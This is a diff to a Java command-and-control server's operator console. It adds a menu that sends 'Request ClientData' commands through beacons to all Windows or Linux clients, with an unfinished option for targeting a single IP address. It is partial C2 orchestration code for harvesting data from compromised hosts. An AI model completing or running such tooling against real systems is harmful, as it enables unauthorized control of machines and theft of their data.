@@ -175,6 +175,12 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println(RESET);
     }
 
+    private void waitForResponse() throws InterruptedException{
+        System.out.println();
+        System.out.println("Waiting for response...");
+        Thread.sleep(5000);
+    }
+
     @Override
     public void run() {
         // User enters password that will be used for authentication
@@ -286,7 +292,43 @@ public class C2ServerUserHandler implements Runnable{
                 } else {
                     System.out.println("Invalid Input");
                 }
-            } 
+            } else if(currentUserPath.equals("Request")){
+                printAttackChain();
+                System.out.println("1. Request from ALL Windows Clients");
+                System.out.println("2. Request from ALL Linux Clients");
+                System.out.println("3. Request from single IP Address");
+                System.out.println("4. Back");
+                System.out.println();
+                System.out.print(currentUserPath + " >> ");
+                userInput = userInputScanner.nextLine();
+                if(userInput.equals("1")){
+                    String OS = "Windows";
+                    // TO DO figure out how to send request to beacon server
+                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
+                        beaconHandler.sendToBeacon("Request ClientData "+ OS +" All");
+                    }
+                    try {
+                        waitForResponse();
+                    } catch (InterruptedException e) {e.printStackTrace();}
+                } else if (userInput.equals("2")){
+                    String OS = "Linux";
+                    // TO DO figure out how to send request to beacon server
+                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
+                        beaconHandler.sendToBeacon("Request ClientData "+ OS +" All");
+                    }
+                    try {
+                        waitForResponse();
+                    } catch (InterruptedException e) {e.printStackTrace();}
+                } else if (userInput.equals("3")){
+                    System.out.print("Enter IP Address for desired request >> ");
+                    String IPAddress = userInputScanner.nextLine();
+                    // TO DO figure out how to send request to beacon server
+                } else if (userInput.equals("4")){
+                        currentUserPath = "";
+                } else {
+                    System.out.println("Invalid Input");
+                }
+            }
         }
     }
 }
